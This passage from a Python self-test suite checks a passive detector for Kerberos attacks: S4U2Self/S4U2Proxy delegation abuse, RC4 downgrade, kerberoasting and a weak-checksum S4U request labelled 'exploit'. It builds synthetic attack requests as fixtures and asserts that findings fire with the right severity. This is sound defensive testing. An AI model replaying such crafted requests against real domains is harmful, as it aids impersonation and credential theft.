    h.check("S4U R1 gate: undecodable padata 130 silent", S4U_X509 not in codes)

    # ---- R2: RC4 downgrade, graded on the per-principal AES latch --------- #
    recs, codes = h.run_krb([("c2s", as_req(padata=[L.PA_ENC_TIMESTAMP])),
                             ("s2c", as_rep(enc_etype=23))])
    d = [r for r in recs if r["finding"] == S4U_RC4]
    h.check("S4U R2: RC4 AS-REP with no baseline fires", bool(d))
    h.check("S4U R2: no baseline grades DOWN to medium, not suppressed",
            bool(d) and d[0]["severity"] == "medium"
            and "no-baseline" in d[0]["detail"]["confidence"])
    h.check("S4U R2: base_severity preserved when graded",
            bool(d) and d[0]["detail"]["base_severity"] == "high")
    h.check("S4U R2: the proxy limitation is stated on the record",
            bool(d) and "PROXY" in d[0]["detail"]["measurement_limit"])
    # AES first, then RC4 for the SAME principal -> a real downgrade.
    recs, codes = h.run_krb([("c2s", as_req(padata=[L.PA_ENC_TIMESTAMP])),
                             ("s2c", as_rep(enc_etype=18)),
                             ("c2s", as_req(padata=[L.PA_ENC_TIMESTAMP], etypes=(23,))),
                             ("s2c", as_rep(enc_etype=23))])
    d = [r for r in recs if r["finding"] == S4U_RC4]
    h.check("S4U R2: AES baseline then RC4 escalates to high",
            bool(d) and d[0]["severity"] == "high" and d[0]["detail"]["aes_baseline"] == [18])
    h.check("S4U R2 gate: an AES-only AS-REP is silent",
            S4U_RC4 not in h.run_krb([("s2c", as_rep(enc_etype=18))])[1])

    # TGS plane: specific supersedes generic.
    recs, codes = h.run_krb([("c2s", s4u_req(
        [(L.PA_FOR_USER, pa_for_user())], etypes=(23, 18)))])
    h.check("S4U R2: RC4 on an S4U TGS-REQ fires", S4U_RC4 in codes)
    h.check("S4U R2: the generic RC4 code is SUPERSEDED on S4U flows",
            "LDAP-KRB-RC4-REQUESTED" not in codes)
    d = [r for r in recs if r["finding"] == S4U_RC4]
    h.check("S4U R2: the plane is recorded", bool(d) and d[0]["detail"]["plane"] == "TGS")
    # ...and the generic code must still own the non-S4U case.
    _, codes = h.run_krb([("c2s", tgs_req(("MSSQLSvc", "db.corp.local"),
                                          opts=KDCOPT_WINDOWS, etypes=(23, 18)))])
    h.check("S4U R2 gate: non-S4U RC4 still belongs to the generic code",
            "LDAP-KRB-RC4-REQUESTED" in codes and S4U_RC4 not in codes)
    _, codes = h.run_krb([("c2s", s4u_req([(L.PA_FOR_USER, pa_for_user())],
                                          etypes=(18, 17)))])
    h.check("S4U R2 gate: AES-only S4U request silent", S4U_RC4 not in codes)

    # ---- R3: S4U2Self ---------------------------------------------------- #
    recs, codes = h.run_krb([("c2s", s4u_req([(L.PA_FOR_USER, pa_for_user(name="alice"))]))])
    d = [r for r in recs if r["finding"] == S4U_SELF]
    h.check("S4U R3: S4U2Self via PA-FOR-USER fires", bool(d))
    h.check("S4U R3: impersonated identity and requesting service both reported",
            bool(d) and d[0]["detail"]["impersonated"] == "alice"
            and d[0]["detail"]["impersonated_realm"] == "CORP.LOCAL"
            and d[0]["detail"]["requesting_service"] == "http/web1.corp.local")
    h.check("S4U R3: default severity is medium (it grades, never gates)",
            bool(d) and d[0]["severity"] == "medium" and d[0]["detail"]["protected_user"] is False)
    h.check("S4U R3: the keyed cksum type is reported, not judged",
            bool(d) and d[0]["detail"]["cksumtype"] == L.CKSUM_HMAC_MD5)
    cfgp = L.Config(); cfgp.protected_users = {"administrator"}
    recs, codes = h.run_krb([("c2s", s4u_req(
        [(L.PA_FOR_USER, pa_for_user(name="Administrator"))]))], config=cfgp)
    d = [r for r in recs if r["finding"] == S4U_SELF]
    h.check("S4U R3: --protected-user escalates to high",
            bool(d) and d[0]["severity"] == "high"
            and d[0]["detail"]["base_severity"] == "medium")
    cfgp2 = L.Config(); cfgp2.protected_users = {"administrator"}
    _, codes = h.run_krb([("c2s", s4u_req(
        [(L.PA_FOR_USER, pa_for_user(name="Administrator@CORP.LOCAL"))]))], config=cfgp2)
    h.check("S4U R3: protected-user matches the pre-@ part too", S4U_SELF in codes)
    _, codes = h.run_krb([("c2s", tgs_req(WEB, opts=KDCOPT_WINDOWS))])
    h.check("S4U R3 gate: an ordinary TGS-REQ with no S4U padata is silent",
            S4U_SELF not in codes)
    _, codes = h.run_krb([("c2s", s4u_req([(L.PA_FOR_USER, b"\x30\x00")]))])
    h.check("S4U R3 gate: PA-FOR-USER with no userName is silent", S4U_SELF not in codes)

    # ---- R4: S4U2Proxy --------------------------------------------------- #
    recs, codes = h.run_krb([("c2s", s4u_req(
        [(L.PA_FOR_USER, pa_for_user())], spn=FS, opts=KDCOPT_S4U2PROXY, addl=1))])
    d = [r for r in recs if r["finding"] == S4U_PROXY]
    h.check("S4U R4: bit 14 with an evidence ticket fires", bool(d))
    h.check("S4U R4: evidence-ticket count and target class reported",
            bool(d) and d[0]["detail"]["additional_tickets"] == 1
            and d[0]["detail"]["target_service_class"] == "cifs")
    h.check("S4U R4: a member-server target does NOT escalate",
            bool(d) and d[0]["severity"] == "medium"
            and d[0]["detail"]["dc_only_service"] is False
            and "grading_limit" in d[0]["detail"])
    h.check("S4U R4: S4U2Self does not also fire on an S4U2Proxy request",
            S4U_SELF not in codes)
    recs, codes = h.run_krb([("c2s", s4u_req(
        [(L.PA_FOR_USER, pa_for_user())], spn=DCL, opts=KDCOPT_S4U2PROXY, addl=1))])
    d = [r for r in recs if r["finding"] == S4U_PROXY]
    h.check("S4U R4: a DC-only service class escalates to high",
            bool(d) and d[0]["severity"] == "high"
            and d[0]["detail"]["dc_only_service"] is True)
    h.check("S4U R4: only ldap/gc/krbtgt are treated as DC-only",
            set(L._DC_ONLY_CLASSES) == {"ldap", "gc", "krbtgt"}
            and "cifs" not in L._DC_ONLY_CLASSES and "host" not in L._DC_ONLY_CLASSES)
    # Both halves are required.
    _, codes = h.run_krb([("c2s", s4u_req([(L.PA_FOR_USER, pa_for_user())],
                                          spn=FS, opts=KDCOPT_S4U2PROXY, addl=0))])
    h.check("S4U R4 gate: bit 14 with NO evidence ticket is not called delegation",
            S4U_PROXY not in codes)
    _, codes = h.run_krb([("c2s", s4u_req([(L.PA_FOR_USER, pa_for_user())],
                                          spn=FS, opts=KDCOPT_WINDOWS, addl=1))])
    h.check("S4U R4 gate: an evidence ticket without bit 14 is not delegation",
            S4U_PROXY not in codes)
    h.check("S4U R4: additional-tickets is decoded from KDC-REQ-BODY [11]",
            L.parse_kerberos(s4u_req([(L.PA_FOR_USER, pa_for_user())],
                                     opts=KDCOPT_S4U2PROXY, addl=2)).addl_tickets == 2)

    # ---- retransmission guard: the RESPONSE_TOO_BIG UDP->TCP re-send ------ #
    # The per-code dedup window would mask this on default config -- it
    # absorbs any repeat for 300s -- so the guard is exercised with dedup
    # turned OFF, which is the operator setting where it is load-bearing.
    def nodedup():
        c = L.Config(); c.krb_dedup_window = 0.0; return c

    exploit = s4u_req([(L.PA_S4U_X509_USER, pa_s4u_x509_user(cksumtype=L.CKSUM_RSA_MD4))])
    _, codes = h.run_krb([("c2s", exploit), ("c2s", exploit)], config=nodedup())
    h.check("S4U retry: with dedup off, a byte-identical re-send is evaluated once",
            codes.count(S4U_X509) == 1)
    _, codes = h.run_krb([("c2s", exploit)], proto="tcp", config=nodedup())
    h.check("S4U retry control: dedup off still lets a single request through",
            codes.count(S4U_X509) == 1)
    rep = as_rep(enc_etype=23)
    _, codes = h.run_krb([("s2c", rep), ("s2c", rep)], config=nodedup())
    h.check("S4U retry: a duplicated AS-REP is reported once",
            codes.count(S4U_RC4) == 1)
    # A genuinely distinct request (fresh nonce) must still be seen twice.
    other = s4u_req([(L.PA_S4U_X509_USER, pa_s4u_x509_user(cksumtype=L.CKSUM_RSA_MD4))],
                    spn=DCL, nonce=999)
    _, codes = h.run_krb([("c2s", exploit), ("c2s", other)], config=nodedup())
    h.check("S4U retry gate: a distinct request is NOT suppressed",
            codes.count(S4U_X509) == 2)
    # ...and once the window has passed, a true repeat is reported again.
    cfg_w = nodedup(); cfg_w.s4u_retry_window = 0.0
    _, codes = h.run_krb([("c2s", exploit), ("c2s", exploit)], config=cfg_w)
    h.check("S4U retry: outside the retry window a repeat is reported again",
            codes.count(S4U_X509) == 2)

    # ---- transport + dual-stack parity for every new code ---------------- #
    s4u_all = s4u_req([(L.PA_FOR_USER, pa_for_user()),
                       (L.PA_S4U_X509_USER, pa_s4u_x509_user(cksumtype=L.CKSUM_RSA_MD4))],
                      spn=DCL, opts=KDCOPT_S4U2PROXY, etypes=(23, 18), addl=1)
    for proto in ("udp", "tcp"):
        _, codes = h.run_krb([("c2s", s4u_all)], proto=proto)
        h.check(f"S4U transport: {proto}/88 carries R1, R2 and R4",
                S4U_X509 in codes and S4U_RC4 in codes and S4U_PROXY in codes)
    recs, codes = h.run_krb([("c2s", s4u_all)], client="2001:db8::5", kdc="2001:db8::10")
    h.check("S4U dual-stack: all three fire over IPv6",
            S4U_X509 in codes and S4U_RC4 in codes and S4U_PROXY in codes)
    h.check("S4U dual-stack: address family recorded on every new finding",
            all(r["detail"]["af"] == "ipv6" for r in recs
                if r["finding"] in (S4U_X509, S4U_RC4, S4U_PROXY)))
    recs, codes = h.run_krb([("c2s", s4u_req([(L.PA_FOR_USER, pa_for_user())]))],
                            client="2001:db8::5", kdc="2001:db8::10")
    h.check("S4U dual-stack: S4U2Self over IPv6",
            S4U_SELF in codes
            and all(r["detail"]["af"] == "ipv6" for r in recs if r["finding"] == S4U_SELF))

    # Transport parity: udp/88, tcp/88 with its own 4-byte framing, and IPv6.
    for proto in ("udp", "tcp"):
        _, codes = h.run_krb([("c2s", tgs_req(SQL))], proto=proto)
        h.check(f"krb transport: {proto}/88 carries the rules", "LDAP-KRB-ROAST-OPTIONS" in codes)
    _, codes = h.run_krb([("c2s", tgs_req(SQL))],
                         client="2001:db8::5", kdc="2001:db8::10")
    h.check("krb transport: IPv6 parity", "LDAP-KRB-ROAST-OPTIONS" in codes)
    recs, _ = h.run_krb([("c2s", tgs_req(SQL))], client="2001:db8::5", kdc="2001:db8::10")
    kr = [r for r in recs if r["finding"] == "LDAP-KRB-ROAST-OPTIONS"]
    h.check("krb: address family recorded on the finding",
            bool(kr) and kr[0]["detail"]["af"] == "ipv6")

    # A TCP message split across segments must still be framed correctly.
    msg = tgs_req(SQL)
    framed = krb_tcp(msg)
    cut = len(framed) // 2
    cfgk = L.Config()
    eng = L.LDAPEngine(cfgk)
    got = []

    class _S:
        def emit(self, r):
            got.append(r)

    fm = L.FlowManager(cfgk, eng, _S())
    fm.handle_krb_tcp(1000.0, "10.10.0.5", 51000, "10.10.0.10", 88, framed[:cut], 0x18)
    fm.handle_krb_tcp(1000.1, "10.10.0.5", 51000, "10.10.0.10", 88, framed[cut:], 0x18)
    h.check("krb: TCP message split across segments reassembled",
            "LDAP-KRB-ROAST-OPTIONS" in [r["finding"] for r in got])

    # Evidence and attribution discipline.
    recs, _ = h.run_krb([("c2s", tgs_req(SQL))])
    kr = [r for r in recs if r["finding"] == "LDAP-KRB-ROAST-OPTIONS"][0]
    h.check("krb: carries the ATT&CK technique", kr["detail"]["technique"] == "T1558.003")
    h.check("krb: tool is explicitly not attributed",
            kr["detail"]["tool"] == "not attributable")
    h.check("krb: says the password outcome is not observable",
            "not observable" in kr["detail"]["note"])
    h.check("krb: no CVE claimed for abuse-of-design",
            "cve" not in kr["detail"])

    # Non-Kerberos traffic on port 88 must not raise or fire.
    for junk in (b"GET / HTTP/1.1\r\n\r\n", b"\x16\x03\x01\x00\x05hello",
                 b"\x30\x03\x02\x01\x01", b"\x00" * 8):
        _, codes = h.run_krb([("c2s", junk)])
        h.check("krb: non-Kerberos payload on :88 is ignored cleanly",
                not any("KRB" in c for c in codes))

    # ---- Finding catalogue sanity ---------------------------------------- #
    h.check("catalogue: 43 finding codes", len(L.FINDINGS) == 43)
    h.check("catalogue: every severity valid",
            all(sev in L.SEVERITY_ORDER for sev, _, _ in L.FINDINGS.values()))

    # ---- LDAP URL host extraction ---------------------------------------- #
    h.check("url: host from ldap url", L._ldap_url_host("ldap://ds.example.com:389/dc=x") == "ds.example.com")
    h.check("url: host from ldaps url", L._ldap_url_host("ldaps://[2001:db8::1]/dc=x") == "2001:db8::1")
    h.check("url: non-ldap url ignored", L._ldap_url_host("http://x/") is None)

    # ---- PASSIVE INVARIANT: production source must contain no TX primitives #
    src_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ldapwatch.py")
    with open(src_path, "r", encoding="utf-8") as fh:
        source = fh.read()
    # Strip comments/docstrings-ish lines to reduce false hits, then scan code.
    code_lines = []
    for line in source.splitlines():
        stripped = line.strip()
        if stripped.startswith("#"):
            continue
        code_lines.append(line)
    code_body = "\n".join(code_lines)
    tx_patterns = [
        r"\bsendp\s*\(", r"\bsendpfast\s*\(", r"\bsr1?\s*\(", r"\bsrp1?\s*\(",
        r"\.send\s*\(", r"\bsocket\.socket\b", r"\bconnect\s*\(", r"\bsendto\s*\(",
        r"\bStreamSocket\b", r"\bL3socket\b", r"\bL2socket\b",
    ]
    hits = []
    for pat in tx_patterns:
        for mobj in re.finditer(pat, code_body):
            # allow 'sniff(' which contains no send; our patterns already exclude it
            hits.append((pat, mobj.group(0)))
    h.check("invariant: no transmit primitives in source", not hits)
    if hits:
        h.fails.append(f"    TX primitives found: {hits}")

    # ---- Report ---------------------------------------------------------- #
    total = h.passed + h.failed
    print(f"\nldapwatch self-test: {h.passed}/{total} checks passed")
    if h.failed:
        print("FAILED:")
        for name in h.fails:
            print(f"  - {name}")
        return 1
    print("all checks passed")
    return 0


if __name__ == "__main__":
    sys.exit(run_selftest())
